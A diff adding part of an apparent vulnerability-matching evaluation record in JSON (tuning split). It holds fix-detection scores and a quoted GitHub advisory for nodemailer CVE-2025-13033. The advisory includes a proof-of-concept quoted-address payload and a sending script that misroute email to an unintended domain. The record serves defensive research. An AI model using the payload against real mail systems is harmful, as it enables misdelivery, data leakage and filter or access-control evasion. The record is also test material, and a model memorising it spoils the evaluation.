+          "local_correspondence_attempted": false,
+          "local_correspondence_used": false,
+          "local_correspondence_status": null,
+          "local_correspondence_methods": [],
+          "local_correspondence_reason": null,
+          "local_correspondence_prior_abstention_reason": null,
+          "fix_signature_coverage": 0.875,
+          "vulnerable_signature_coverage": 0.7272727272727273,
+          "signature_evidence_state": "both",
+          "independent_region_count": 1,
+          "vulnerable_support_count": 0,
+          "patched_support_count": 1,
+          "side_consensus_ratio": 1.0,
+          "fix_evidence": [
+            "both vulnerable and fix signatures present; treated as non-exclusive",
+            "removed vulnerable construct retained"
+          ],
+          "contradictions": []
+        },
+        {
+          "status": "uncertain",
+          "abstention_reason": "S_FAILED",
+          "advisories": [
+            {
+              "ghsa_id": "GHSA-mm7p-fcc7-pg87",
+              "cve_id": "CVE-2025-13033",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-20",
+                  "name": "Improper Input Validation"
+                },
+                {
+                  "cwe_id": "CWE-436",
+                  "name": "Interpretation Conflict"
+                }
+              ],
+              "severity": "medium",
+              "advisory_title": "Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict",
+              "advisory_description": "The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.",
+              "advisory_url": "https://github.com/advisories/GHSA-mm7p-fcc7-pg87",
+              "advisory_references": [
+                "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87",
+                "https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626",
+                "https://nvd.nist.gov/vuln/detail/CVE-2025-13033",
+                "https://access.redhat.com/security/cve/CVE-2025-13033",
+                "https://bugzilla.redhat.com/show_bug.cgi?id=2402179",
+                "https://github.com/advisories/GHSA-mm7p-fcc7-pg87"
+              ],
+              "osv_id": "GHSA-mm7p-fcc7-pg87",
+              "package_name": "nodemailer",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "7.0.7"
+              ]
+            }
+          ],
+          "evidence_pair_ids": [
+            "boundary-77036393e97e485ad4a8ab2d0705cce2f6c2bc5febafee558f13e7ebb76286cb:changed"
+          ],
+          "lineage_id": "lineage-e9c5ea48bd7c56549910dd63ab88121bcb3199f31519efb6258765e3de3a3cb9",
+          "fix_boundary_id": "boundary-77036393e97e485ad4a8ab2d0705cce2f6c2bc5febafee558f13e7ebb76286cb",
+          "fix_commit_sha": "1150d99fba77280df2cfb1885c43df23109a8626",
+          "vulnerable_score": 0.0,
+          "patched_score": 0.0,
+          "correspondence_score": 0.48484848484848486,
+          "contrast_score": 0.0,
+          "structural_vulnerable": 0.6363636363636364,
+          "structural_patched": 0.6153846153846154,
+          "token_vulnerable": 0.48484848484848486,
+          "token_patched": 0.42105263157894735,
+          "edit_strategy": "not_run",
+          "edit_vulnerable": 0.0,
+          "edit_patched": 0.0,
+          "edit_margin": 0.0,
+          "edit_vulnerable_anchor_has_identity": null,
+          "edit_patched_anchor_has_identity": null,
+          "edit_raw_vulnerable": null,
+          "edit_raw_patched": null,
+          "edit_contrastive_vulnerable": null,
+          "edit_contrastive_patched": null,
+          "edit_contrastive_used": false,
+          "structure_gate_passed": false,
+          "token_gate_passed": false,
+          "context_correspondence_passed": false,
+          "function_identity_state": "conflict",
+          "edit_anchor_has_identity": null,
+          "boundary_identity_gate_passed": true,
+          "boundary_rejected": false,
+          "containment_fallback_attempted": true,
+          "containment_fallback_used": false,
+          "local_correspondence_attempted": false,
+          "local_correspondence_used": false,
+          "local_correspondence_status": null,
+          "local_correspondence_methods": [],
+          "local_correspondence_reason": null,
+          "local_correspondence_prior_abstention_reason": null,
+          "fix_signature_coverage": 0.2,
+          "vulnerable_signature_coverage": 0.2777777777777778,
+          "signature_evidence_state": "neither",
+          "independent_region_count": 1,
+          "vulnerable_support_count": 1,
+          "patched_support_count": 0,
+          "side_consensus_ratio": 1.0,
+          "fix_evidence": [
+            "added fix signature absent"
+          ],
+          "contradictions": []
+        }
+      ],
+      "package_applicabilities": [
+        {
+          "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+          "package": "lodash",
+          "ecosystem": "npm",
+          "status": "unknown",
+          "evidence": []
+        },
+        {
+          "lineage_id": "lineage-e9c5ea48bd7c56549910dd63ab88121bcb3199f31519efb6258765e3de3a3cb9",
+          "package": "nodemailer",
+          "ecosystem": "npm",
+          "status": "unknown",
+          "evidence": []
+        }
+      ],
+      "parser_supported": true,
+      "message": null
+    },
+    "configuration_id": "8ec8d769169ca8ab8851106980c2538c24e5b5196309afcacd493835b56a4b5e",
+    "split": "tuning",
+    "checkpoint_key": "3e9cc9cc1ad765b2aaaf22d9b15cdd20a5f58a64d894f45c05b165e0787e6c1a"
+  },
+  "content_sha256": "579cccaddb1e377be135fcbfef8932b86d11540a0aab30468b7ffe8f5f307154"
+}
